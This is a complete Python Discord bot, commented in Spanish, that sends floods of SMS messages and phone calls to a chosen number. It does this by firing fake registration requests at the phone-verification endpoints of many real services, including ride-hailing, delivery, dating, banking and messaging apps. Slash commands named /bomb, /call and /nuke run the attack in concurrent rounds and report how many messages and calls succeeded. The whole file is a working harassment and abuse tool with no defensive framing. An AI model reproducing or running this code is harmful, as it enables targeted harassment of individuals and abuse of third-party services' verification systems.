#!/usr/bin/env python3
"""
Discord SMS/CALL Bomber Bot - MULTI-API v2
Usa multiples servicios para maximizar SMS y LLAMADAS
"""

import discord
from discord.ext import commands
from discord import app_commands
import requests
import asyncio
import uuid
import os
import random
import string
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    print("ERROR: Configura la variable DISCORD_TOKEN")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

executor = ThreadPoolExecutor(max_workers=50)

class Bomber:
    def __init__(self):
        self.results = {"sms_ok": 0, "sms_fail": 0, "call_ok": 0, "call_fail": 0}
        self.session = requests.Session()
        self.session.verify = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        ]

    def reset(self):
        self.results = {"sms_ok": 0, "sms_fail": 0, "call_ok": 0, "call_fail": 0}

    def random_ua(self):
        return random.choice(self.user_agents)

    def generate_uuid(self):
        return str(uuid.uuid4())

    def generate_email(self):
        domains = ["gmail.com", "hotmail.com", "outlook.es", "yahoo.es"]
        return f"user{uuid.uuid4().hex[:8]}@{random.choice(domains)}"

    def generate_name(self):
        nombres = ["Carlos", "Maria", "Juan", "Ana", "Pedro", "Laura", "Miguel", "Carmen", "Jose", "Lucia"]
        apellidos = ["Garcia", "Martinez", "Lopez", "Sanchez", "Gonzalez", "Rodriguez", "Fernandez", "Perez"]
        return random.choice(nombres), random.choice(apellidos)

    def try_api(self, url, data=None, method="POST", headers=None, is_call=False):
        """Intenta enviar a una API"""
        try:
            h = {
                "User-Agent": self.random_ua(),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
                "Content-Type": "application/json",
                "Origin": url.split("/")[0] + "//" + url.split("/")[2],
                "Referer": url.split("/")[0] + "//" + url.split("/")[2] + "/"
            }
            if headers:
                h.update(headers)

            if method == "POST":
                resp = self.session.post(url, json=data, headers=h, timeout=10)
            else:
                resp = self.session.get(url, params=data, headers=h, timeout=10)

            success = resp.status_code in [200, 201, 202, 204]
            # Algunos servicios devuelven 200 pero con error en body
            if success and resp.text:
                try:
                    j = resp.json()
                    if j.get("error") or j.get("code") not in [None, 0, 200, "OK", "SUCCESS"]:
                        if j.get("code") not in [0, 200]:
                            success = False
                except:
                    pass
            return success
        except Exception as e:
            return False

    # ========== BOLT - SMS Y LLAMADA ==========

    def bolt_driver_sms(self, phone):
        """Bolt Driver Registration - SMS"""
        try:
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {"version": "HP.24.33", "device_name": "HP", "device_os_version": "web", "deviceId": "web", "deviceType": "web", "language": "es-es"}
            nombre, apellido = self.generate_name()
            data1 = {
                "email": self.generate_email(),
                "phone": phone,
                "city_id": 1617,  # Madrid
                "first_name": nombre,
                "last_name": apellido,
                "terms_consent_accepted": 1
            }
            resp1 = self.session.post(url1, params=params, json=data1, timeout=10)
            if resp1.status_code != 200:
                return False
            token = resp1.json().get("data", {}).get("token")
            if not token:
                return False

            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            data2 = {
                "token": token,
                "verification_code_channel": "sms",
                "device_os_version": "web",
                "device_name": self.random_ua(),
                "deviceId": self.generate_uuid(),
                "device_type": "web",
                "version": "DR.3.90",
                "language": "es-es",
                "visitor_id": f"visitor-driver-{self.generate_uuid()}"
            }
            resp2 = self.session.post(url2, json=data2, timeout=10)
            return resp2.status_code == 200 and resp2.json().get("code") == 0
        except:
            return False

    def bolt_driver_call(self, phone):
        """Bolt Driver Registration - LLAMADA"""
        try:
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {"version": "HP.24.33", "device_name": "HP", "device_os_version": "web", "deviceId": "web", "deviceType": "web", "language": "es-es"}
            nombre, apellido = self.generate_name()
            data1 = {
                "email": self.generate_email(),
                "phone": phone,
                "city_id": 1617,
                "first_name": nombre,
                "last_name": apellido,
                "terms_consent_accepted": 1
            }
            resp1 = self.session.post(url1, params=params, json=data1, timeout=10)
            if resp1.status_code != 200:
                return False
            token = resp1.json().get("data", {}).get("token")
            if not token:
                return False

            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            data2 = {
                "token": token,
                "verification_code_channel": "call",  # LLAMADA
                "device_os_version": "web",
                "device_name": self.random_ua(),
                "deviceId": self.generate_uuid(),
                "device_type": "web",
                "version": "DR.3.90",
                "language": "es-es",
                "visitor_id": f"visitor-driver-{self.generate_uuid()}"
            }
            resp2 = self.session.post(url2, json=data2, timeout=10)
            return resp2.status_code == 200 and resp2.json().get("code") == 0
        except:
            return False

    def bolt_user_sms(self, phone):
        """Bolt User - SMS"""
        headers = {
            "X-Bolt-Client-Id": "web",
        }
        return self.try_api(
            "https://user.bolt.eu/user/register/phone",
            {"phone": phone, "phone_uuid": self.generate_uuid(), "country": "es"},
            headers=headers
        )

    # ========== GLOVO - SMS Y LLAMADA ==========

    def glovo_sms(self, phone):
        """Glovo - SMS"""
        headers = {
            "Glovo-App-Platform": "web",
            "Glovo-App-Type": "customer",
            "Glovo-Api-Version": "14",
            "Glovo-Location-City-Code": "MAD"
        }
        return self.try_api(
            "https://api.glovoapp.com/v3/auth/phone/code",
            {"phoneNumber": phone, "method": "sms"},
            headers=headers
        )

    def glovo_call(self, phone):
        """Glovo - LLAMADA"""
        headers = {
            "Glovo-App-Platform": "web",
            "Glovo-App-Type": "customer",
            "Glovo-Api-Version": "14",
            "Glovo-Location-City-Code": "MAD"
        }
        return self.try_api(
            "https://api.glovoapp.com/v3/auth/phone/code",
            {"phoneNumber": phone, "method": "call"},
            headers=headers
        )

    def glovo_v2_sms(self, phone):
        """Glovo Identity - SMS"""
        headers = {
            "Glovo-App-Platform": "web",
            "Glovo-App-Type": "customer",
            "Glovo-Api-Version": "14"
        }
        return self.try_api(
            "https://api.glovoapp.com/v0/identity/flow/start_verification",
            {
                "identityValue": {"phoneNumber": phone},
                "identityType": "PHONE_NUMBER",
                "identityMetadata": {"selectedVerificationMethod": "SMS"}
            },
            headers=headers
        )

    def glovo_v2_call(self, phone):
        """Glovo Identity - LLAMADA"""
        headers = {
            "Glovo-App-Platform": "web",
            "Glovo-App-Type": "customer",
            "Glovo-Api-Version": "14"
        }
        return self.try_api(
            "https://api.glovoapp.com/v0/identity/flow/start_verification",
            {
                "identityValue": {"phoneNumber": phone},
                "identityType": "PHONE_NUMBER",
                "identityMetadata": {"selectedVerificationMethod": "VOICE_CALL"}
            },
            headers=headers
        )

    # ========== CABIFY ==========

    def cabify_sms(self, phone):
        """Cabify - SMS"""
        headers = {
            "X-Client-Platform": "web",
            "X-Client-Version": "1.0.0"
        }
        return self.try_api(
            "https://cabify.com/api/mobile/v3/auth/request-otp",
            {"phone_number": phone, "channel": "sms"},
            headers=headers
        )

    def cabify_call(self, phone):
        """Cabify - LLAMADA"""
        headers = {
            "X-Client-Platform": "web",
            "X-Client-Version": "1.0.0"
        }
        return self.try_api(
            "https://cabify.com/api/mobile/v3/auth/request-otp",
            {"phone_number": phone, "channel": "call"},
            headers=headers
        )

    # ========== FREENOW (mytaxi) ==========

    def freenow_sms(self, phone):
        """FreeNow - SMS"""
        return self.try_api(
            "https://api.free-now.com/passenger-account/v1/verification/phone/request",
            {"phoneNumber": phone, "type": "SMS"},
            headers={"X-Api-Key": "web-passenger"}
        )

    def freenow_call(self, phone):
        """FreeNow - LLAMADA"""
        return self.try_api(
            "https://api.free-now.com/passenger-account/v1/verification/phone/request",
            {"phoneNumber": phone, "type": "CALL"},
            headers={"X-Api-Key": "web-passenger"}
        )

    # ========== UBER ==========

    def uber_sms(self, phone):
        """Uber - SMS"""
        headers = {
            "X-Uber-Device": "web",
            "X-Uber-Device-Location-Latitude": "40.4168",
            "X-Uber-Device-Location-Longitude": "-3.7038"
        }
        return self.try_api(
            "https://auth.uber.com/v2/challenge/phone/request",
            {"phoneNumber": phone, "challengeType": "SMS"},
            headers=headers
        )

    def uber_call(self, phone):
        """Uber - LLAMADA"""
        headers = {
            "X-Uber-Device": "web",
            "X-Uber-Device-Location-Latitude": "40.4168",
            "X-Uber-Device-Location-Longitude": "-3.7038"
        }
        return self.try_api(
            "https://auth.uber.com/v2/challenge/phone/request",
            {"phoneNumber": phone, "challengeType": "CALL"},
            headers=headers
        )

    # ========== WALLAPOP ==========

    def wallapop_sms(self, phone):
        """Wallapop - SMS"""
        # Quitar el + para wallapop
        phone_clean = phone.replace("+", "")
        return self.try_api(
            "https://api.wallapop.com/api/v3/users/phone-verification/request",
            {"phone": phone_clean, "prefix": "34"},
            headers={"X-DeviceOS": "0"}
        )

    # ========== VINTED ==========

    def vinted_sms(self, phone):
        """Vinted - SMS"""
        return self.try_api(
            "https://www.vinted.es/api/v2/phone_verification/request",
            {"phone_number": phone},
            headers={"X-Vinted-App-Version": "web"}
        )

    # ========== MILANUNCIOS ==========

    def milanuncios_sms(self, phone):
        """Milanuncios - SMS"""
        phone_clean = phone.replace("+34", "")
        return self.try_api(
            "https://www.milanuncios.com/api/v3/users/phones/verification",
            {"phone": phone_clean},
        )

    # ========== GETIR ==========

    def getir_sms(self, phone):
        """Getir - SMS"""
        return self.try_api(
            "https://getir.com/api/auth/phone/send-code",
            {"phoneNumber": phone, "countryCode": "ES"},
            headers={"X-Getir-Platform": "web"}
        )

    # ========== DELIVEROO ==========

    def deliveroo_sms(self, phone):
        """Deliveroo - SMS"""
        return self.try_api(
            "https://api.deliveroo.com/orderapp/v1/auth/phone",
            {"phone_number": phone},
            headers={"X-Roo-Country": "es"}
        )

    # ========== JUST EAT ==========

    def justeat_sms(self, phone):
        """JustEat - SMS"""
        return self.try_api(
            "https://es.just-eat.es/api/account/register/phone",
            {"phoneNumber": phone},
        )

    # ========== TINDER ==========

    def tinder_sms(self, phone):
        """Tinder - SMS"""
        return self.try_api(
            "https://api.gotinder.com/v2/auth/sms/send",
            {"phone_number": phone},
            headers={"X-Auth-Token": "", "Platform": "web"}
        )

    # ========== BUMBLE ==========

    def bumble_sms(self, phone):
        """Bumble - SMS"""
        return self.try_api(
            "https://api.bumble.com/mwebapi.pyi",
            {"$gpb": "badoo.bma.BadooMessage", "body": [{"message_type": 2, "phone_number": phone}]},
        )

    # ========== BADOO ==========

    def badoo_sms(self, phone):
        """Badoo - SMS"""
        return self.try_api(
            "https://badoo.com/webapi.pyi",
            {"$gpb": "badoo.bma.BadooMessage", "body": [{"message_type": 2, "phone_number": phone}]},
        )

    # ========== TELEGRAM ==========

    def telegram_sms(self, phone):
        """Telegram - SMS"""
        return self.try_api(
            "https://my.telegram.org/auth/send_password",
            {"phone": phone},
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )

    # ========== WHATSAPP (via web) ==========

    def whatsapp_sms(self, phone):
        """WhatsApp Business - SMS"""
        phone_clean = phone.replace("+", "")
        return self.try_api(
            "https://v.whatsapp.net/v2/code",
            {"phone": phone_clean, "method": "sms"},
        )

    # ========== PAYPAL ==========

    def paypal_sms(self, phone):
        """PayPal - SMS"""
        return self.try_api(
            "https://www.paypal.com/auth/api/challenge/request",
            {"phone": phone, "challengeType": "SMS"},
        )

    # ========== REVOLUT ==========

    def revolut_sms(self, phone):
        """Revolut - SMS"""
        return self.try_api(
            "https://app.revolut.com/api/retail/auth/phone",
            {"phone": phone},
        )

    # ========== BIZUM (via banco) ==========

    def bizum_sms(self, phone):
        """Bizum - SMS (simulado)"""
        return self.try_api(
            "https://api.bizum.es/api/v1/phone/verify",
            {"phone": phone.replace("+34", "")},
        )

    # ========== ALIEXPRESS ==========

    def aliexpress_sms(self, phone):
        """AliExpress - SMS"""
        return self.try_api(
            "https://login.aliexpress.com/api/sms/send",
            {"phoneNum": phone, "countryCode": "ES"},
        )

    # ========== SHEIN ==========

    def shein_sms(self, phone):
        """Shein - SMS"""
        return self.try_api(
            "https://es.shein.com/api/auth/sms/send",
            {"phone": phone.replace("+34", ""), "areaCode": "34"},
        )

    # ========== N26 ==========

    def n26_sms(self, phone):
        """N26 - SMS"""
        return self.try_api(
            "https://api.tech26.de/api/signup/phone",
            {"phoneNumber": phone},
        )

    # ========== BBVA ==========

    def bbva_sms(self, phone):
        """BBVA - SMS"""
        return self.try_api(
            "https://www.bbva.es/ASO/TechArqSeguridadClavesSMSFacade/V01/phones/verification",
            {"phoneNumber": phone.replace("+34", "")},
        )

    def get_sms_services(self):
        """Retorna servicios de SMS"""
        return [
            # Prioritarios - Mas probabilidad de funcionar
            ("Bolt Driver", self.bolt_driver_sms),
            ("Bolt User", self.bolt_user_sms),
            ("Glovo", self.glovo_sms),
            ("Glovo v2", self.glovo_v2_sms),
            ("Cabify", self.cabify_sms),
            ("FreeNow", self.freenow_sms),
            ("Uber", self.uber_sms),
            ("Wallapop", self.wallapop_sms),
            ("Vinted", self.vinted_sms),
            ("Milanuncios", self.milanuncios_sms),
            ("Getir", self.getir_sms),
            ("Deliveroo", self.deliveroo_sms),
            ("JustEat", self.justeat_sms),
            # Dating
            ("Tinder", self.tinder_sms),
            ("Bumble", self.bumble_sms),
            ("Badoo", self.badoo_sms),
            # Comunicacion
            ("Telegram", self.telegram_sms),
            ("WhatsApp", self.whatsapp_sms),
            # Finanzas
            ("PayPal", self.paypal_sms),
            ("Revolut", self.revolut_sms),
            ("Bizum", self.bizum_sms),
            ("N26", self.n26_sms),
            ("BBVA", self.bbva_sms),
            # Shopping
            ("AliExpress", self.aliexpress_sms),
            ("Shein", self.shein_sms),
        ]

    def get_call_services(self):
        """Retorna servicios de LLAMADA"""
        return [
            ("Bolt Driver CALL", self.bolt_driver_call),
            ("Glovo CALL", self.glovo_call),
            ("Glovo v2 CALL", self.glovo_v2_call),
            ("Cabify CALL", self.cabify_call),
            ("FreeNow CALL", self.freenow_call),
            ("Uber CALL", self.uber_call),
        ]

    def call_service_sync(self, service_func, phone, is_call=False):
        """Llama un servicio de forma sincrona"""
        try:
            result = service_func(phone)
            if result:
                if is_call:
                    self.results["call_ok"] += 1
                else:
                    self.results["sms_ok"] += 1
            else:
                if is_call:
                    self.results["call_fail"] += 1
                else:
                    self.results["sms_fail"] += 1
            return result
        except:
            if is_call:
                self.results["call_fail"] += 1
            else:
                self.results["sms_fail"] += 1
            return False

    async def bomb_sms(self, phone, rounds=1):
        """Bombardea con SMS"""
        services = self.get_sms_services()
        loop = asyncio.get_event_loop()

        for r in range(rounds):
            tasks = []
            for name, service in services:
                task = loop.run_in_executor(executor, self.call_service_sync, service, phone, False)
                tasks.append(task)
            await asyncio.gather(*tasks)
            yield (r + 1) * len(services)

    async def bomb_call(self, phone, rounds=1):
        """Bombardea con LLAMADAS"""
        services = self.get_call_services()
        loop = asyncio.get_event_loop()

        for r in range(rounds):
            tasks = []
            for name, service in services:
                task = loop.run_in_executor(executor, self.call_service_sync, service, phone, True)
                tasks.append(task)
            await asyncio.gather(*tasks)
            yield (r + 1) * len(services)

    async def bomb_all(self, phone, rounds=1):
        """Bombardea con TODO (SMS + LLAMADAS)"""
        sms_services = self.get_sms_services()
        call_services = self.get_call_services()
        all_services = [(n, s, False) for n, s in sms_services] + [(n, s, True) for n, s in call_services]
        loop = asyncio.get_event_loop()

        for r in range(rounds):
            tasks = []
            for name, service, is_call in all_services:
                task = loop.run_in_executor(executor, self.call_service_sync, service, phone, is_call)
                tasks.append(task)
            await asyncio.gather(*tasks)
            yield (r + 1) * len(all_services)

    def test_service(self, name, phone):
        """Testea un servicio individual"""
        all_services = self.get_sms_services() + self.get_call_services()
        for sname, func in all_services:
            if name.lower() in sname.lower():
                try:
                    result = func(phone)
                    return sname, result
                except Exception as e:
                    return sname, f"Error: {e}"
        return None, None

bomber = Bomber()

@bot.event
async def on_ready():
    print(f"="*50)
    print(f"  BOT CONECTADO: {bot.user}")
    print(f"  Servidores: {len(bot.guilds)}")
    print(f"  SMS: {len(bomber.get_sms_services())} servicios")
    print(f"  CALL: {len(bomber.get_call_services())} servicios")
    print(f"="*50)
    try:
        synced = await bot.tree.sync()
        print(f"  Comandos sincronizados: {len(synced)}")
    except Exception as e:
        print(f"  Error sync: {e}")

@bot.tree.command(name="bomb", description="Bombardear numero con SMS")
@app_commands.describe(
    phone="Numero con codigo (+34...)",
    rounds="Rondas de bombardeo"
)
async def bomb_command(interaction: discord.Interaction, phone: str, rounds: int = 3):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 20))

    bomber.reset()
    services = bomber.get_sms_services()
    total = rounds * len(services)

    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;33mSMS BOMBER\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Servicios: {len(services)}\n"
        f"Rondas: {rounds}\n"
        f"Total: {total}\n"
        f"{'='*35}\n"
        f"Bombardeando...\n"
        f"```"
    )

    async for progress in bomber.bomb_sms(phone, rounds):
        await interaction.edit_original_response(content=
            f"```ansi\n"
            f"\x1b[1;33mSMS BOMBER - EN PROGRESO\x1b[0m\n"
            f"{'='*35}\n"
            f"Target: {phone}\n"
            f"Progreso: {progress}/{total}\n"
            f"\x1b[1;32mSMS OK: {bomber.results['sms_ok']}\x1b[0m\n"
            f"\x1b[1;31mFallidos: {bomber.results['sms_fail']}\x1b[0m\n"
            f"{'='*35}\n"
            f"```"
        )

    rate = bomber.results['sms_ok']*100//max(1,total)
    await interaction.edit_original_response(content=
        f"```ansi\n"
        f"\x1b[1;32mSMS BOMBER - COMPLETADO\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Total intentos: {total}\n"
        f"\x1b[1;32mSMS ENVIADOS: {bomber.results['sms_ok']}\x1b[0m\n"
        f"Fallidos: {bomber.results['sms_fail']}\n"
        f"Tasa exito: {rate}%\n"
        f"{'='*35}\n"
        f"```"
    )

@bot.tree.command(name="call", description="Bombardear numero con LLAMADAS")
@app_commands.describe(
    phone="Numero con codigo (+34...)",
    rounds="Rondas de bombardeo"
)
async def call_command(interaction: discord.Interaction, phone: str, rounds: int = 5):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 30))

    bomber.reset()
    services = bomber.get_call_services()
    total = rounds * len(services)

    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;35mCALL BOMBER\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Servicios: {len(services)}\n"
        f"Rondas: {rounds}\n"
        f"Total: {total}\n"
        f"{'='*35}\n"
        f"Llamando...\n"
        f"```"
    )

    async for progress in bomber.bomb_call(phone, rounds):
        await interaction.edit_original_response(content=
            f"```ansi\n"
            f"\x1b[1;35mCALL BOMBER - EN PROGRESO\x1b[0m\n"
            f"{'='*35}\n"
            f"Target: {phone}\n"
            f"Progreso: {progress}/{total}\n"
            f"\x1b[1;32mLLAMADAS OK: {bomber.results['call_ok']}\x1b[0m\n"
            f"\x1b[1;31mFallidas: {bomber.results['call_fail']}\x1b[0m\n"
            f"{'='*35}\n"
            f"```"
        )

    rate = bomber.results['call_ok']*100//max(1,total)
    await interaction.edit_original_response(content=
        f"```ansi\n"
        f"\x1b[1;32mCALL BOMBER - COMPLETADO\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Total intentos: {total}\n"
        f"\x1b[1;32mLLAMADAS OK: {bomber.results['call_ok']}\x1b[0m\n"
        f"Fallidas: {bomber.results['call_fail']}\n"
        f"Tasa exito: {rate}%\n"
        f"{'='*35}\n"
        f"```"
    )

@bot.tree.command(name="nuke", description="Bombardear con TODO (SMS + LLAMADAS)")
@app_commands.describe(
    phone="Numero con codigo (+34...)",
    rounds="Rondas de bombardeo"
)
async def nuke_command(interaction: discord.Interaction, phone: str, rounds: int = 3):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 15))

    bomber.reset()
    sms_count = len(bomber.get_sms_services())
    call_count = len(bomber.get_call_services())
    total = rounds * (sms_count + call_count)

    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;31mNUKE MODE\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"SMS: {sms_count} | CALL: {call_count}\n"
        f"Rondas: {rounds}\n"
        f"Total: {total}\n"
        f"{'='*35}\n"
        f"DESTRUYENDO...\n"
        f"```"
    )

    async for progress in bomber.bomb_all(phone, rounds):
        await interaction.edit_original_response(content=
            f"```ansi\n"
            f"\x1b[1;31mNUKE MODE - EN PROGRESO\x1b[0m\n"
            f"{'='*35}\n"
            f"Target: {phone}\n"
            f"Progreso: {progress}/{total}\n"
            f"\x1b[1;32mSMS OK: {bomber.results['sms_ok']}\x1b[0m\n"
            f"\x1b[1;35mCALL OK: {bomber.results['call_ok']}\x1b[0m\n"
            f"\x1b[1;31mFallidos: {bomber.results['sms_fail'] + bomber.results['call_fail']}\x1b[0m\n"
            f"{'='*35}\n"
            f"```"
        )

    total_ok = bomber.results['sms_ok'] + bomber.results['call_ok']
    rate = total_ok*100//max(1,total)
    await interaction.edit_original_response(content=
        f"```ansi\n"
        f"\x1b[1;32mNUKE COMPLETADO\x1b[0m\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"\x1b[1;32mSMS ENVIADOS: {bomber.results['sms_ok']}\x1b[0m\n"
        f"\x1b[1;35mLLAMADAS OK: {bomber.results['call_ok']}\x1b[0m\n"
        f"\x1b[1;33mTOTAL EXITOS: {total_ok}\x1b[0m\n"
        f"Tasa: {rate}%\n"
        f"{'='*35}\n"
        f"```"
    )

@bot.tree.command(name="test", description="Testear un servicio especifico")
@app_commands.describe(
    service="Nombre del servicio (ej: bolt, glovo, cabify)",
    phone="Numero de prueba"
)
async def test_command(interaction: discord.Interaction, service: str, phone: str):
    if not phone.startswith("+"):
        phone = "+34" + phone

    await interaction.response.send_message(f"```\nTesteando {service}...\n```")

    name, result = bomber.test_service(service, phone)

    if name is None:
        await interaction.edit_original_response(content=
            f"```\nServicio '{service}' no encontrado.\nUsa /services para ver disponibles.\n```"
        )
    else:
        status = "OK - SMS/LLAMADA ENVIADO" if result == True else f"FALLO - {result}"
        color = "\x1b[1;32m" if result == True else "\x1b[1;31m"
        await interaction.edit_original_response(content=
            f"```ansi\n"
            f"TEST: {name}\n"
            f"{'='*35}\n"
            f"Numero: {phone}\n"
            f"Resultado: {color}{status}\x1b[0m\n"
            f"{'='*35}\n"
            f"```"
        )

@bot.tree.command(name="services", description="Ver servicios disponibles")
async def services_command(interaction: discord.Interaction):
    sms = bomber.get_sms_services()
    calls = bomber.get_call_services()

    sms_names = [n for n, _ in sms]
    call_names = [n for n, _ in calls]

    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;33mSERVICIOS DISPONIBLES\x1b[0m\n"
        f"{'='*40}\n"
        f"\x1b[1;32mSMS ({len(sms)}):\x1b[0m\n"
        f"  {', '.join(sms_names[:13])}\n"
        f"  {', '.join(sms_names[13:])}\n"
        f"\n"
        f"\x1b[1;35mLLAMADAS ({len(calls)}):\x1b[0m\n"
        f"  {', '.join(call_names)}\n"
        f"{'='*40}\n"
        f"Comandos:\n"
        f"  /bomb +34XXX 5  - Solo SMS\n"
        f"  /call +34XXX 10 - Solo llamadas\n"
        f"  /nuke +34XXX 3  - TODO\n"
        f"  /test bolt +34XXX - Probar 1\n"
        f"```"
    )

@bot.tree.command(name="help", description="Ver comandos")
async def help_command(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"```ansi\n"
        f"\x1b[1;36mBOMBER BOT v2 - COMANDOS\x1b[0m\n"
        f"{'='*40}\n"
        f"\x1b[1;33m/bomb\x1b[0m <numero> <rondas>\n"
        f"   Bombardear con SMS\n"
        f"   Ej: /bomb +34612345678 5\n"
        f"\n"
        f"\x1b[1;35m/call\x1b[0m <numero> <rondas>\n"
        f"   Bombardear con LLAMADAS\n"
        f"   Ej: /call +34612345678 10\n"
        f"\n"
        f"\x1b[1;31m/nuke\x1b[0m <numero> <rondas>\n"
        f"   SMS + LLAMADAS (todo)\n"
        f"   Ej: /nuke +34612345678 3\n"
        f"\n"
        f"\x1b[1;32m/test\x1b[0m <servicio> <numero>\n"
        f"   Probar un servicio\n"
        f"   Ej: /test bolt +34612345678\n"
        f"\n"
        f"/services - Ver servicios\n"
        f"/help - Esta ayuda\n"
        f"{'='*40}\n"
        f"```"
    )

# Comandos con prefijo ! tambien
@bot.command(name="bomb")
async def bomb_prefix(ctx, phone: str, rounds: int = 3):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 20))
    bomber.reset()
    total = rounds * len(bomber.get_sms_services())
    msg = await ctx.send(f"```\nBombardeando {phone}...\n```")
    async for progress in bomber.bomb_sms(phone, rounds):
        await msg.edit(content=f"```\n{progress}/{total} | SMS OK: {bomber.results['sms_ok']}\n```")
    await msg.edit(content=f"```\nCOMPLETADO - SMS: {bomber.results['sms_ok']}/{total}\n```")

@bot.command(name="call")
async def call_prefix(ctx, phone: str, rounds: int = 5):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 30))
    bomber.reset()
    total = rounds * len(bomber.get_call_services())
    msg = await ctx.send(f"```\nLlamando {phone}...\n```")
    async for progress in bomber.bomb_call(phone, rounds):
        await msg.edit(content=f"```\n{progress}/{total} | CALL OK: {bomber.results['call_ok']}\n```")
    await msg.edit(content=f"```\nCOMPLETADO - LLAMADAS: {bomber.results['call_ok']}/{total}\n```")

@bot.command(name="nuke")
async def nuke_prefix(ctx, phone: str, rounds: int = 3):
    if not phone.startswith("+"):
        phone = "+34" + phone
    rounds = max(1, min(rounds, 15))
    bomber.reset()
    total = rounds * (len(bomber.get_sms_services()) + len(bomber.get_call_services()))
    msg = await ctx.send(f"```\nNUKE {phone}...\n```")
    async for progress in bomber.bomb_all(phone, rounds):
        total_ok = bomber.results['sms_ok'] + bomber.results['call_ok']
        await msg.edit(content=f"```\n{progress}/{total} | OK: {total_ok}\n```")
    total_ok = bomber.results['sms_ok'] + bomber.results['call_ok']
    await msg.edit(content=f"```\nNUKE COMPLETADO - {total_ok}/{total}\n```")

if __name__ == "__main__":
    sms = len(Bomber().get_sms_services())
    calls = len(Bomber().get_call_services())
    print(f"\nIniciando bot: {sms} SMS + {calls} CALL = {sms+calls} servicios...")
    bot.run(TOKEN)
